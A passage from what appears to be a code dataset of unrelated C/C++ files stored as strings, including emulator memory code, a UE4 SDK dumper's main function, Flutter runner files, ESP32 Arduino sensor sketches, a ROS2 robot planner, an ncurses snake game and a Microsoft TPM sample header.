or iloscgraczy == 4)\r\n\t{\r\n\t\tpoczatek(juzdobrane, gracz3, dlugosc, ilekartwrence3);\r\n\t\tdlugosc += 5;\r\n\t}\r\n\tif (iloscgraczy == 4)\r\n\t{\r\n\t\tpoczatek(juzdobrane, gracz4, dlugosc, ilekartwrence4);\r\n\t\tdlugosc += 5;\r\n\t}\r\n\r\n\r\n\tdo\r\n\t{\r\n\t\tbool y = false;\r\n\t\tif (makao1 == false && ilekartwrence1 == 1)\r\n\t\t{\r\n\r\n\t\t\tfor (int i = 0; i <= 5; i++)\r\n\t\t\t{\r\n\t\t\t\tdraw(juzdobrane, gracz1, dlugosc, ilekartwrence1, 1);\r\n\t\t\t\tilekartwrence1 += 1;\r\n\t\t\t\tdlugosc += 1;\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t\tif (makao2 == false && ilekartwrence2 == 1)\r\n\t\t{\r\n\r\n\t\t\tfor (int i = 0; i <= 5; i++)\r\n\t\t\t{\r\n\t\t\t\tdraw(juzdobrane, gracz2, dlugosc, ilekartwrence2, 1);\r\n\t\t\t\tilekartwrence2 += 1;\r\n\t\t\t\tdlugosc += 1;\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t\tif (makao3 == false && ilekartwrence3 == 1)\r\n\t\t{\r\n\t\t\tfor (int i = 0; i <= 5; i++)\r\n\t\t\t{\r\n\t\t\t\tdraw(juzdobrane, gracz3, dlugosc, ilekartwrence3, 5);\r\n\t\t\t\tilekartwrence3 += 5;\r\n\t\t\t\tdlugosc += 5;\r\n\t\t\t}\r\n\t\t}\r\n\t\tif (makao4 == false && ilekartwrence4 == 1)\r\n\t\t{",
    "// SPDX-FileCopyrightText: 2015 Citra Emulator Project\n// SPDX-FileCopyrightText: 2018 yuzu Emulator Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include <algorithm>\n#include <cstring>\n#include <mutex>\n#include <span>\n\n#include \"common/assert.h\"\n#include \"common/atomic_ops.h\"\n#include \"common/common_types.h\"\n#include \"common/heap_tracker.h\"\n#include \"common/logging/log.h\"\n#include \"common/page_table.h\"\n#include \"common/scope_exit.h\"\n#include \"common/settings.h\"\n#include \"common/swap.h\"\n#include \"core/core.h\"\n#include \"core/device_memory.h\"\n#include \"core/gpu_dirty_memory_manager.h\"\n#include \"core/hardware_properties.h\"\n#include \"core/hle/kernel/k_page_table.h\"\n#include \"core/hle/kernel/k_process.h\"\n#include \"core/memory.h\"\n#include \"video_core/gpu.h\"\n#include \"video_core/host1x/gpu_device_memory_manager.h\"\n#include \"video_core/host1x/host1x.h\"\n#include \"video_core/rasterizer_download_area.h\"\n\nnamespace Core::Memory {\n\nnamespace {\n\nbool AddressSpaceContains(const Common::PageTable& table, const Common::ProcessAddress addr,\n                          const std::size_t size) {\n    const Common::ProcessAddress max_addr = 1ULL << table.GetAddressSpaceBits();\n    return addr + size >= addr && addr + size <= max_addr;\n}\n\n} // namespace\n\n// Implementation class used to keep the specifics of the memory subsystem hidden\n// from outside classes. This also allows modification to the internals of the memory\n// subsystem without needing to rebuild all files that make use of the memory interface.\nstruct Memory::Impl {\n    explicit Impl(Core::System& system_) : system{system_} {}\n\n    void SetCurrentPageTable(Kernel::KProcess& process) {\n        current_page_table = &process.GetPageTable().GetImpl();\n\n        if (process.IsApplication() && Settings::IsFastmemEnabled()) {\n            current_page_table->fastmem_arena = system.DeviceMemory().buffer.VirtualBasePointer();\n        } else {\n            current_page_table->fastmem_arena = nullptr;\n        }\n\n#ifdef __linux__\n        heap_tracker.emplace(system.DeviceMemory().buffer);\n        buffer = std::addressof(*heap_tracker);\n#else\n        buffer = std::addressof(system.DeviceMemory().buffer);\n#endif\n    }\n\n    void MapMemoryRegion(Common::PageTable& page_table, Common::ProcessAddress base, u64 size,\n                         Common::PhysicalAddress target, Common::MemoryPermission perms,\n                         bool separate_heap) {\n        ASSERT_MSG((size & SUYU_PAGEMASK) == 0, \"non-page aligned size: {:016X}\", size);\n        ASSERT_MSG((base & SUYU_PAGEMASK) == 0, \"non-page aligned base: {:016X}\", GetInteger(base));\n        ASSERT_MSG(target >= DramMemoryMap::Base, \"Out of bounds target: {:016X}\",\n                   GetInteger(target));\n        MapPages(page_table, base / SUYU_PAGESIZE, size / SUYU_PAGESIZE, target,\n                 Common::PageType::Memory);\n\n        if (current_page_table->fastmem_arena) {\n            buffer->Map(GetInteger(base), GetInteger(target) - DramMemoryMap::Base, size, perms,\n                        separate_heap);\n        }\n    }\n\n    void UnmapRegion(Common::PageTable& page_table, Common::ProcessAddress base, u64 size,\n                     bool separate_heap) {\n        ASSERT_MSG((size & SUYU_PAGEMASK) == 0, \"non-page aligned size: {:016X}\", size);\n        ASSERT_MSG((base & SUYU_PAGEMASK) == 0, \"non-page aligned base: {:016X}\", GetInteger(base));\n        MapPages(page_table, base / SUYU_PAGESIZE, size / SUYU_PAGESIZE, 0,\n                 Common::PageType::Unmapped);\n\n        if (current_page_table->fastmem_arena) {\n            buffer->Unmap(GetInteger(base), size, separate_heap);\n        }\n    }\n\n    void ProtectRegion(Common::PageTable& page_table, VAddr vaddr, u64 size,\n                       Common::MemoryPermission perms) {\n        ASSERT_MSG((size & SUYU_PAGEMASK) == 0, \"non-page aligned size: {:016X}\", size);\n        ASSERT_MSG((vaddr & SUYU_PAGEMASK) == 0, \"non-page aligned base: {:016X}\", vaddr);\n\n        if (!current_page_table->fastmem_arena) {\n            return;\n        }\n\n        u64 protect_bytes{};\n        u64 protect_begin{};\n        for (u64 addr = vaddr; addr < vaddr + size; addr += SUYU_PAGESIZE) {\n            const Common::PageType page_type{\n                current_page_table->pointers[addr >> SUYU_PAGEBITS].Type()};\n            switch (page_type) {\n            case Common::PageType::RasterizerCachedMemory:\n                if (protect_bytes > 0) {\n                    buffer->Protect(protect_begin, protect_bytes, perms);\n                    protect_bytes = 0;\n                }\n                break;\n            default:\n                if (protect_bytes == 0) {\n                    protect_begin = addr;\n                }\n                protect_bytes += SUYU_PAGESIZE;\n            }\n        }\n\n        if (protect_bytes > 0) {\n            buffer->Protect(protect_begin, protect_bytes, perms);\n        }\n    }\n\n    [[nodiscard]] u8* GetPointerFromRasterizerCachedMemory(u64 vaddr) const {\n        const Common::Physical",
    "#include <fmt/core.h>\n#include \"dumper.h\"\n#include \"utils.h\"\n#include \"locale.h\"\n\nint main(int argc, char* argv[])\n{\n    uint64 start;\n    uint64 end;\n    uint64 time;\n\n    setlocale(LC_ALL, \"en_US.UTF-8\");\n\n    auto dumper = Dumper::GetInstance();\n\n    start = GetTime();\n    switch (dumper->Init(argc, argv))\n    {\n    case STATUS::WINDOW_NOT_FOUND: { puts(\"Can't find UE4 window\"); return 1; }\n    case STATUS::PROCESS_NOT_FOUND: { puts(\"Can't find process\"); return 1; }\n    case STATUS::READER_ERROR: { puts(\"Can't init reader\"); return 1; }\n    case STATUS::CANNOT_GET_PROCNAME: { puts(\"Can't get process name\"); return 1; }\n    case STATUS::ENGINE_NOT_FOUND: { puts(\"Can't find offsets for this game\"); return 1; }\n    case STATUS::ENGINE_FAILED: { puts(\"Can't init engine for this game\"); return 1; }\n    case STATUS::MODULE_NOT_FOUND: { puts(\"Can't enumerate modules (protected process?)\"); return 1; }\n    case STATUS::CANNOT_READ: { puts(\"Can't read process memory\"); return 1; }\n    case STATUS::INVALID_IMAGE: { puts(\"Can't get executable sections\"); return 1; }\n    case STATUS::SUCCESS: { break; };\n    default: { return 1; }\n    }\n    end = GetTime();\n    time = (end - start) / 10000;\n    fmt::print(\"Init time: {} ms\\n\", time);\n\n    start = GetTime();\n    switch (dumper->Dump())\n    {\n    case STATUS::FILE_NOT_OPEN: { puts(\"Can't open file\"); return 1; }\n    case STATUS::ZERO_PACKAGES: { puts(\"Size of packages is zero\"); return 1; }\n    case STATUS::SUCCESS: { break; }\n    default: { return 1; }\n    }\n    end = GetTime();\n    time = (end - start) / 10000;\n    fmt::print(\"Dump time: {} ms\\n\", time);\n\n    return 0;\n}\n",
    "#include \"Screen.h\"\n#include <iostream>\n\nScreen::Screen() {\n    width = 0;\n    height = 0;\n    screenMatrix = nullptr;\n    matrixSize = 0;\n}\n\nScreen::Screen(int width, int height) {\n    this->width = width;\n    this->height = height;\n    matrixSize = (width + 1) * height;\n\n    screenMatrix = new char[matrixSize];\n    for (int i = 0; i < matrixSize; i++) {\n        if (i % (this->width+1) == this->width) {\n            screenMatrix[i] = '\\n';\n            continue;\n        }\n\n        screenMatrix[i] = ' ';\n    }\n    screenMatrix[matrixSize - 1] = 0;\n}\n\nScreen::~Screen() {\n    delete[] screenMatrix;\n}\n\nScreen& Screen::operator=(const Screen& screen) {\n    delete[] screenMatrix;\n\n    width = screen.width;\n    height = screen.height;\n    matrixSize = screen.matrixSize;\n\n    screenMatrix = new char[matrixSize];\n    for (int i = 0; i < matrixSize; i++) {\n        screenMatrix[i] = screen.screenMatrix[i];\n    }\n    screenMatrix[matrixSize - 1] = 0;\n\n    return *this;\n}\n\nvoid Screen::reset() {\n    for (int i = 0; i < matrixSize; i++) {\n        if (i % (width + 1) == width) {\n            screenMatrix[i] = '\\n';\n            continue;\n        }\n\n        screenMatrix[i] = ' ';\n    }\n    screenMatrix[matrixSize - 1] = 0;\n}\n\nvoid Screen::input(char text, int x, int y) {\n    if (x < 0 || x >= width || y < 0 || y >= height) {\n        return;\n    }\n\n    screenMatrix[x + y * (width+1)] = text;\n}\n\nvoid Screen::rect(char text, int x, int y, int width, int height) {\n    for (int i = x; i < x + width; i++) {\n        for (int j = y; j < y + height; j++) {\n            input(text, i, j);\n        }\n    }\n}\n\nvoid Screen::text(std::string text, int x, int y) {\n    for (int i = 0, j = 0, k = 0; i < text.length(); i++, j++) {\n        if (text[i] == '\\n') {\n            j = -1;\n            k++;\n            continue;\n        }\n        input(text[i], x + j, y + k);\n    }\n}\n\nvoid Screen::print() {\n    std::cout << \"\\x1b[?25l\\x1b[1;1H\";\n\n    //printout += \"\\x1b[38;2;255;255;0m\";\n\n    std::cout << screenMatrix;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"destinichallenge\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\n#include <Arduino.h>\n#include <WiFi.h>\n#include <WiFiUdp.h>\n\n/* Function Declarations*/\nvoid sendUDPDataString();\nvoid receiveUDPMessage();\n\n/* WiFi */\n//Network name (SSID) and password (WPA)\nconstexpr char SSID_NAME[] = \"StefanIOT\";\nconstexpr char SSID_PASSWORD[] = \"stefaniot\";\n\n/* UDP */\n//Udp object\nWiFiUDP Udp;\n\n//Receiver IP-address and port\n//copy here what's written in unity console when first running the unity project\nIPAddress RECEIVER_IP_ADDRESS (192, 168, 87, 175); \nconstexpr int RECEIVER_PORT = 50195;\nconstexpr int LOCAL_PORT = 3002;\n\n//Data string used to send UDP messages\nString UDPDataString = \"\";\n\n//Char array used to receive UDP messages (assuming max packet size is 255 bytes)\nchar UDPPacketBuffer[255];\n\n/* UPDATE Cycles*/\n//Delay interval between each sensor cycle\nconstexpr int SENSOR_CYCLE_DELAY = 100;\nlong lastSensorCycle = 0;\n\n\n//Delay interval between each sensor cycle\nconstexpr int ACTUATOR_CYCLE_DELAY = 100;\nlong lastActuatorCycle = 0;\n\n/* SENSORS */\nconstexpr int potentiometerPin = 33;\nint potentiometerValue = 0;\n                \n/* ACTUATORS */\nconstexpr int LEDPin = 23;\nint LEDValue = 0;\n            \nvoid setup() {\n    \n    /* SERIAL */\n    Serial.begin(9600);\n    while (!Serial);\n\n    /* WiFi */\n    //Begin WiFi\n    WiFi.begin(SSID_NAME, SSID_PASSWORD);\n    while (WiFi.status() != WL_CONNECTED) {\n      Serial.print(\"Attempting to connect to SSID: \");\n      Serial.println(SSID_NAME);\n\t\t\t\n\t\t\tdelay(1000);\n    }\n    Serial.println(\"Connected to WiFi\");\n\n    //print this device's IP address to be used in unity\n    Serial.print(\"IP Address: \" + WiFi.localIP().toString() + \"\\n\");\n\n    /* UDP */\n    //Begin UDP\n    Udp.begin(LOCAL_PORT);\n    Serial.println(\"UDP Begun\");\n\n    /* SENSORS */\n    pinMode(potentiometerPin, INPUT);\n\n    /* ACTUATORS */\n    pinMode(LEDPin, OUTPUT);\n}\n\nvoid loop() {\n    /* SEND UDP */\n    if((millis() - lastSensorCycle) > SENSOR_CYCLE_DELAY){ \n\t    lastSensorCycle = millis();\n\n      //Send potentiometer state\n      potentiometerValue = analogRead(potentiometerPin);\n      UDPDataString = \"potentiometer|\" + String(potentiometerValue);\n      sendUDPDataString();\n  }\n\n    /* RECEIVE UDP */\n    if((millis() - lastActuatorCycle) > ACTUATOR_CYCLE_DELAY){ \n\t    lastActuatorCycle = millis();\n\n      //Receive LED state\n      receiveUDPMessage();\n    }\n}\n\n/* UDP */\n//Send current UDPDataString to Unity\nvoid sendUDPDataString() {\n  Udp.beginPacket(RECEIVER_IP_ADDRESS, RECEIVER_PORT);\n  Udp.print(UDPDataString); \n  Udp.endPacket();\n  Serial.print(\"Send UDP message: \");\n  Serial.println(UDPDataString);\n}\n\n//Receive UDP DataString from Unity\nvoid receiveUDPMessage() {\n  if (Udp.parsePacket()) {\n    int length = Udp.read(UDPPacketBuffer, 255);\n    if (length > 0) {\n      UDPPacketBuffer[length] = 0;\n      Serial.print(\"Received UDP message: \");\n      Serial.println(UDPPacketBuffer);\n    }\n\n    // Parse the message\n    char* part;\n    char actuatorID[255];\n    int value;\n\n    // Get the actuator ID\n    part = strtok(UDPPacketBuffer, \"|\");\n    if (part != NULL) {\n      strcpy(actuatorID, part);\n    }\n\n    // Get the actuator value\n    part = strtok(NULL, \"|\");\n    if (part != NULL) {\n      value = atoi(part); // Convert string to integer\n    }\n\n    // Set the LED state\n    if(strcmp(actuatorID, \"LED\") == 0) {\n        LEDValue = value;\n        digitalWrite(LEDPin, LEDValue);\n    }\n  }\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <Arduino.h>\n\n// PARAMETROS\nint MAX = 2971;// MAX 2971  0 % MOLHADO\nint MIN = 1000;// MIN 1000 100% MOLHADO\n\n//PINOS\n#define SENSOR 35\n#define RED 5\n#define YELLOW 18\n#define GREEN 19\n#define LED_PIN 2\n\n\nvoid setup() {\n  Serial.begin(115200);\n  pinMode(SENSOR, INPUT);\n  pinMode(RED, OUTPUT);\n  pinMode(YELLOW, OUTPUT);\n  pinMode(GREEN, OUTPUT);\n  pinMode(LED_PIN, OUTPUT);\n}\n\nvoid loop() {\n  int leitura = analogRead(SENSOR);\n  int percentage = map(leitura, MIN, MAX, 100, 0);\n  Serial.println(percentage);\n  digitalWrite(LED_PIN, HIGH);\n  delay(50);\n  digitalWrite(LED_PIN, LOW);\n    if (percentage < 60) {\n    Serial.println(\"RED\");\n    digitalWrite(RED, HIGH);\n    digitalWrite(YELLOW, LOW);\n    digitalWrite(GREEN, LOW);\n  } else if (percentage >= 70 && percentage < 80) {\n    Serial.println(\"YELLOW\");\n    digitalWrite(RED, LOW);\n    digitalWrite(YELLOW, HIGH);\n    digitalWrite(GREEN, LOW);\n  } else {\n    Serial.println(\"GREEN\");\n    digitalWrite(RED, LOW);\n    digitalWrite(YELLOW, LOW);\n    digitalWrite(GREEN, HIGH);\n  }\n  delay(5*60*1000);\n}\n\n",
    "#include <geometry_msgs/msg/twist.hpp>\n#include <rclcpp/rclcpp.hpp>\n#include <traffic_management_system/msg/robot_details.hpp>\n\nclass RobotPlanner : public rclcpp::Node {\n public:\n  RobotPlanner() : Node(\"robot_planner\") {\n    subscription_ =\n        this->create_subscription<traffic_management_system::msg::RobotDetails>(\n            \"/robot_details\", 10,\n            std::bind(&RobotPlanner::robotDetailsCallback, this,\n                      std::placeholders::_1));\n\n    robot1_cmd_vel_publisher_ =\n        this->create_publisher<geometry_msgs::msg::Twist>(\"/tb3_0/cmd_vel\", 10);\n\n    robot2_cmd_vel_publisher_ =\n        this->create_publisher<geometry_msgs::msg::Twist>(\"/tb3_1/cmd_vel\", 10);\n  }\n\n private:\n  void robotDetailsCallback(\n      const traffic_management_system::msg::RobotDetails::SharedPtr msg) {\n    std::string robot_name = msg->robot_name;\n    bool robot_in_junction = msg->in_junction;\n\n    bool prev_robot_in_junction = robots_status_[robot_name];\n\n    robots_status_[robot_name] = robot_in_junction;\n\n    if (robots_status_[\"robot_1\"] && robots_status_[\"robot_2\"]) {\n      if (robot_in_junction != prev_robot_in_junction) {\n        if (robot_name == \"robot_1\") {\n          stopRobot(\"robot_1\");\n        }\n\n        else if (robot_name == \"robot_2\") {\n          stopRobot(\"robot_2\");\n        }\n      }\n    }\n  }\n\n  void stopRobot(const std::string& robot_name) {\n    geometry_msgs::msg::Twist stop_cmd_vel;\n    stop_cmd_vel.linear.x = 0.0;\n    stop_cmd_vel.angular.z = 0.0;\n\n    RCLCPP_INFO(this->get_logger(), \"%s cmd_vel: linear = %f, angular = %f\",\n                robot_name.c_str(), stop_cmd_vel.linear.x,\n                stop_cmd_vel.angular.z);\n\n    if (robot_name == \"robot_1\") {\n      robot1_cmd_vel_publisher_->publish(stop_cmd_vel);\n    }\n\n    else if (robot_name == \"robot_2\") {\n      robot2_cmd_vel_publisher_->publish(stop_cmd_vel);\n    }\n  }\n\n  rclcpp::Subscription<traffic_management_system::msg::RobotDetails>::SharedPtr\n      subscription_;\n  rclcpp::Publisher<geometry_msgs::msg::Twist>::SharedPtr\n      robot1_cmd_vel_publisher_;\n\n  rclcpp::Publisher<geometry_msgs::msg::Twist>::SharedPtr\n      robot2_cmd_vel_publisher_;\n\n  std::unordered_map<std::string, bool> robots_status_;\n\n  geometry_msgs::msg::Twist robot_1_cmd_vel_;\n  geometry_msgs::msg::Twist robot_2_cmd_vel_;\n};\n\nint main(int argc, char** argv) {\n  rclcpp::init(argc, argv);\n  auto node = std::make_shared<RobotPlanner>();\n  rclcpp::spin(node);\n  rclcpp::shutdown();\n  return 0;\n}\n\n// One case: If both are entering at the same time?",
    "//Libraries used\n#include <iostream> \n#include <time.h>\n#include <cstdlib>\n#include <vector>\n#include <ncurses.h>\n#include <unistd.h> \nusing namespace std;\n\n//Tools facilits\n#define initSize 1\n#define berry '#'\n#define head '@'\n#define body 'o'\n#define background ' '\n#define wall 'X'\n#define mapSize 30\n#define jMapSize mapSize*2\nint iBeforeCoord = -1;\nint jBeforeCoord = -1;\nchar direction = 'p';\nint delay = 110000;\n\n//Functions\n\n//Useless in this mode\nvoid display(char map[][jMapSize]){\n    for (int i = 0 ; i < mapSize ; i++){\n            for (int j = 0 ; j < mapSize ; j++){\n                cout << map[i][j] << background;\n            }\n            cout << \"\\n\";\n        }\n}\n\nvoid score(int points) {\n\n    points = (points - initSize) * 10 ;\n    move(mapSize,0);\n    printw(\"Score: %d\", points);\n    move(mapSize+1,0);\n    \n}\n\n//Condition of Game Over\nbool gameOver(vector<pair<int,int>> nextPosition, char map[][jMapSize]){\n    if(map[nextPosition[0].first][nextPosition[0].second] == wall || \n        map[nextPosition[0].first][nextPosition[0].second] == body) return 1;\n    else return 0;\n}\n\n\n//Moviments control\nvoid move(vector<pair<int,int>> &nextPosition, int i){\n    char key;\n    key = getch();\n\n\n    switch(key){\n            case 's':\n                if(direction != 'w') direction = 's';\n                break;\n            case 'w':\n                if(direction != 's') direction = 'w';\n                break;\n            case 'a':\n                if(direction != 'd') direction = 'a';\n                break;\n            case 'd':\n                if(direction != 'a') direction = 'd';\n                break;\n    }\n\n\n    switch(direction){\n            case 's':\n                nextPosition[i].first++;\n                break;\n            case 'w':\n                nextPosition[i].first--;\n                break;\n            case 'a':\n                nextPosition[i].second--;\n                break;\n            case 'd':\n                nextPosition[i].second++;\n                break;\n    }\n\n}\n\nvoid makeBerry(char map[][jMapSize],int& ibefore, int& jbefore){\n    int i = rand();\n    int j = rand();\n\n    i = i%mapSize;\n    j = j%jMapSize;\n\n\n    if(map[i][j] == body || map[i][j] == head || i <= 0 || j <= 0 \n        || i == (mapSize-1) || j == (jMapSize-1) || i == ibefore || j == jbefore){\n\n        makeBerry(map,ibefore,jbefore);\n\n    }else{\n        ibefore = i;\n        jbefore = j;\n\n        map[i][j] = berry;\n\n        mvprintw(i,j,\"%c\",berry);\n    }\n\n}\n\nvoid snake(char map[][jMapSize],int parte, int& size,vector<pair<int,int>> &beforePosition, \n    vector<pair<int,int>> &Position, vector<pair<int,int>> &nextPosition){\n\n    //Creating a new body if eat a berry\n    if(Position.size() < size){\n        Position.resize(size);\n        beforePosition.resize(size);\n        nextPosition.resize(size);\n    }\n    \n\n    //Coordenadas da parte posterior indo para a anterior\n    if(parte > 0 && parte < size){\n        nextPosition[parte].first = Position[parte-1].first;\n        nextPosition[parte].second = Position[parte-1].second;\n\n        Position[parte].first = beforePosition[parte-1].first;\n        Position[parte].second = beforePosition[parte-1].second;\n        \n    }\n\n\n    //Head's moviment\n    if(parte == 0){\n        move(nextPosition,parte);\n    }\n\n    map[Position[parte].first][Position[parte].second] = background;\n    mvprintw(Position[parte].first, Position[parte].second, \"%c\", background);\n\n\n    if(parte >= 0 && parte < size-1){\n        snake(map,parte+1,size,beforePosition,Position,nextPosition);\n    }\n\n    beforePosition[parte].first = Position[parte].first;\n    beforePosition[parte].second = Position[parte].second;\n\n\n    Position[parte].first = nextPosition[parte].first;\n    Position[parte].second = nextPosition[parte].second;\n\n    if(parte == 0){\n        //Condi\u00e7\u00f5es: Check conditions before put head in next place\n            //Berrys\n            if(map[nextPosition[parte].first][nextPosition[parte].second] == berry){\n                makeBerry(map,iBeforeCoord,jBeforeCoord);\n                size++;\n            }\n            //Game over\n            if(gameOver(nextPosition,map)){\n                mvprintw(nextPosition[parte].first, nextPosition[parte].second, \"%c\", head);\n\n                mvprintw(mapSize/2,(jMapSize/3)-1, \"Game Over!!!\");\n                refresh();\n                while(getch() != '\\n');\n\n                endwin();\n                exit(0);\n            }\n\n        map[nextPosition[parte].first][nextPosition[parte].second] = head;\n\n        mvprintw(nextPosition[parte].first, nextPosition[parte].second, \"%c\", head);\n\n    }else{\n        map[nextPosition[parte].first][nextPosition[parte].second] = body;\n\n        mvprintw(nextPosition[parte].first, nextPosition[parte].second, \"%c\", body);\n\n    }\n    \n    \n\n}\n\nvoid initCoord(int& i, int& j){\n    i = rand()%mapSize;\n    j = rand()%jMapSize;\n\n    if(i == 0 || i == (mapSize-1) || j == 0 || j == (jMapSize-1)) initCoord(i,j);\n}\n\n\nint main(){\n    srand(time(NULL));\n\n//Setting",
    "/*++\n\nTHIS CODE AND INFORMATION IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF\nANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A\nPARTICULAR PURPOSE.\n\nCopyright (c) Microsoft Corporation.  All rights reserved.\n\nModule Name:\n\n    Support.cpp\n\nAbstract:\n\n    Support functions for  that are not in direct relation for the SDK\n    samples for the Platform Crypto Provider.\n\n--*/\n\n#include \"includes.h\"\n#include \"Utils.h\"\n\n#ifndef SIPAEVENT_MORBIT_NOT_CANCELABLE\n#define SIPAEVENT_MORBIT_NOT_CANCELABLE    (SIPAEVENTTYPE_INFORMATION + 0x0008)\n#endif // SIPAEVENT_MORBIT_NOT_CANCELABLE\n\n#ifndef SIPAEVENT_APPLICATION_SVN\n#define SIPAEVENT_APPLICATION_SVN          (SIPAEVENTTYPE_INFORMATION + 0x0009)\n#endif // SIPAEVENT_APPLICATION_SVN\n\n#ifndef SIPAEVENT_SVN_CHAIN_STATUS\n#define SIPAEVENT_SVN_CHAIN_STATUS         (SIPAEVENTTYPE_INFORMATION + 0x000a)\n#endif // SIPAEVENT_SVN_CHAIN_STATUS\n\n#ifndef SIPAEVENT_BOOT_REVOCATION_LIST\n#define SIPAEVENT_BOOT_REVOCATION_LIST     (SIPAEVENTTYPE_PREOSPARAMETER + 0x0002)\n#endif // SIPAEVENT_BOOT_REVOCATION_LIST\n\n#ifndef SIPAEVENT_SI_POLICY\n#define SIPAEVENT_SI_POLICY                (SIPAEVENTTYPE_OSPARAMETER + 0x000F)\n#endif // SIPAEVENT_SI_POLICY\n\n#ifndef SIPAEVENT_HYPERVISOR_MMIO_NX_POLICY\n#define SIPAEVENT_HYPERVISOR_MMIO_NX_POLICY (SIPAEVENTTYPE_OSPARAMETER + 0x0010)\n#endif // SIPAEVENT_HYPERVISOR_MMIO_NX_POLICY\n\n#ifndef SIPAEVENT_HYPERVISOR_MSR_FILTER_POLICY\n#define SIPAEVENT_HYPERVISOR_MSR_FILTER_POLICY (SIPAEVENTTYPE_OSPARAMETER + 0x0011)\n#endif // SIPAEVENT_HYPERVISOR_MSR_FILTER_POLICY\n\n#ifndef SIPAEVENT_VSM_LAUNCH_TYPE\n#define SIPAEVENT_VSM_LAUNCH_TYPE          (SIPAEVENTTYPE_OSPARAMETER + 0x0012)\n#endif // SIPAEVENT_VSM_LAUNCH_TYPE\n\n#ifndef SIPAEVENT_OS_REVOCATION_LIST\n#define SIPAEVENT_OS_REVOCATION_LIST       (SIPAEVENTTYPE_OSPARAMETER + 0x0013)\n#endif // SIPAEVENT_OS_REVOCATION_LIST\n\n#ifndef SIPAEVENT_VSM_IDK_INFO\n#define SIPAEVENT_VSM_IDK_INFO             (SIPAEVENTTYPE_OSPARAMETER + 0x0020)\n#endif // SIPAEVENT_VSM_IDK_INFO\n\n#ifndef SIPAEVENT_MODULE_SVN\n#define SIPAEVENT_MODULE_SVN               (SIPAEVENTTYPE_LOADEDMODULE + 0x000b)\n#endif // SIPAEVENT_MODULE_SVN\n\n#ifndef SIPAEVENTTYPE_VBS\n#define SIPAEVENTTYPE_VBS                  (0x000A0000)\n\n#define SIPAEVENT_VBS_VSM_REQUIRED         (SIPAEVENTTYPE_VBS + 0x0001)\n\n#define SIPAEVENT_VBS_SECUREBOOT_REQUIRED  (SIPAEVENTTYPE_VBS + 0x0002)\n\n#define SIPAEVENT_VBS_IOMMU_REQUIRED       (SIPAEVENTTYPE_VBS + 0x0003)\n\n#define SIPAEVENT_VBS_MMIO_NX_REQUIRED     (SIPAEVENTTYPE_VBS + 0x004)\n\n#define SIPAEVENT_VBS_MSR_FILTERING_REQUIRED (SIPAEVENTTYPE_VBS + 0x0005)\n\n#define SIPAEVENT_VBS_MANDATORY_ENFORCEMENT (SIPAEVENTTYPE_VBS + 0x006)\n\n#define SIPAEVENT_VBS_HVCI_POLICY          (SIPAEVENTTYPE_VBS + 0x007)\n\n#define SIPAEVENT_VBS_MICROSOFT_BOOT_CHAIN_REQUIRED (SIPAEVENTTYPE_VBS + 0x008)\n\n#endif // SIPAEVENTTYPE_VBS\n\nEVENT_TYPE_DATA TcgId[] = {\n    {SIPAEV_PREBOOT_CERT, L\"EV_Preboot_Cert\"},\n    